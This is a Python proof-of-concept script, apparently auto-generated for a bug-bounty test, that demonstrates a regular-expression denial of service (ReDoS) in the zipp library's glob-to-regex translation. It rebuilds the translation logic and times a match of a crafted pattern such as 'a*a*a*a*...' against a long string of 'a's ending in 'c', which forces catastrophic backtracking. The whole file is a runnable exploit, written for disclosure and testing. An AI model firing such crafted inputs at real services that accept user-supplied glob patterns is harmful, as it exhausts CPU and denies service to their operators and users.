#!/usr/bin/env python3
# PoC for zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c (/tmp/bounty_test/zipp_src/zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c)
# Path: redos-004
# Sink: star_not_empty
# Auto-generated — run with: python3 redos_resulting_regex_star_not_empty.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept for ReDoS in zipp (glob-to-regex translation).

Vulnerability:
  The pattern translation in translate_core() / star_not_empty() generates
  regex with multiple greedy [^/]+ segments.  A user‑controlled glob pattern
  like 'a*a*a*a*a*a' combined with a long zip entry name ending with a
  non‑matching character (e.g., 'aaaa...c') causes catastrophic backtracking.

Usage:
  ./poc_redos.py [--pattern 'a*a*a*a...' --string-length N]
"""

import re
import time
import sys
import argparse

# ----------------------------------------------------------------------
# Minimal reproduction of the vulnerable translation logic
# (mirrors zipp/glob.py: star_not_empty + translate_core + replace)
# ----------------------------------------------------------------------
def star_not_empty(pattern, seps='/'):
    """Replace every '*' that appears inside a non‑separator segment with '?*'."""
    not_seps_pattern = rf'[^{re.escape(seps)}]+'
    def handle_segment(m):
        seg = m.group(0)
        return seg.replace('*', '?*')
    return re.sub(not_seps_pattern, handle_segment, pattern)


def replace_literal(char, seps='/'):
    """Map one glob metacharacter to its regex equivalent; else escape literal."""
    if char == '*':
        return f'[^{re.escape(seps)}]*'
    if char == '?':
        return f'[^{re.escape(seps)}]'
    # Note: full translation also handles '**' but we ignore it here
    return re.escape(char)


def translate_core(pattern, seps='/'):
    """Return regex string that would be compiled by zipp."""
    after_star = star_not_empty(pattern, seps)
    # Separate out each character and apply replace
    regex_parts = [replace_literal(c, seps) for c in after_star]
    return ''.join(regex_parts)


def build_regex(glob_pattern):
    """Produce the final regex (without prefix) used by zipp.fullmatch."""
    # The library also wraps with prefix, but for ReDoS we just need the core.
    return translate_core(glob_pattern)


# ----------------------------------------------------------------------
# Main exploit demonstration
# ----------------------------------------------------------------------
def exploit(pattern, string_len, timeout=5, threshold=1.0):
    """
    Attempt to match the generated regex against a crafted string.
    Return (vulnerable_flag, elapsed_time).
    """
    # Build the malicious target string:
    #   many 'a's followed by a single 'c' (non‑'a', non‑sep) to force backtracking
    target = 'a' * string_len + 'c'

    regex_str = build_regex(pattern)
    try:
        compiled = re.compile(regex_str)
    except re.error as e:
        print(f"[!] Regex compilation failed: {e}")
        return False, 0.0

    # Time the fullmatch operation
    start = time.monotonic()
    matched = compiled.fullmatch(target)
    elapsed = time.monotonic() - start

    # A match is not expected (due to final 'c'), but if it happens, we still measure.
    if matched:
        print(f"[?] Unexpected match – pattern may not be triggering backtracking.")
    return elapsed >= threshold, elapsed


def main():
    parser = argparse.ArgumentParser(
        description='ReDoS PoC for zipp glob‑to‑regex translation'
    )
    parser.add_argument(
        '--pattern',
        default='a*a*a*a*a*a*a*a*a*a',   # 10 stars
        help='Malicious glob pattern (default: 10 alternating a’s and stars)'
    )
    parser.add_argument(
        '--string-length',
        type=int,
        default=100,
        help='Number of leading "a"s in the target filename (default: 100)'
    )
    parser.add_argument(
        '--threshold',
        type=float,
        default=1.0,
        help='Seconds to consider as vulnerable (default: 1.0)'
    )
    args = parser.parse_args()

    print(f"[*] Pattern       : {args.pattern}")
    print(f"[*] String length : {args.string_length}  (+ final 'c')")
    print(f"[*] Threshold     : {args.threshold}s")
    print()

    vulnerable, elapsed = exploit(args.pattern, args.string_length, threshold=args.threshold)

    if vulnerable:
        print(f"[+] VULNERABLE – regex matching took {elapsed:.2f}s (>={args.threshold}s)")
        print("[+] This confirms the ReDoS via exponential backtracking in star_not_empty.")
    else:
        print(f"[-] Not vulnerable – {elapsed:.3f}s (below threshold)")
        print("[*] Try increasing --string-length or --pattern star count.")

    return 0 if vulnerable else 1


if __name__ == '__main__':
    sys.exit(main())
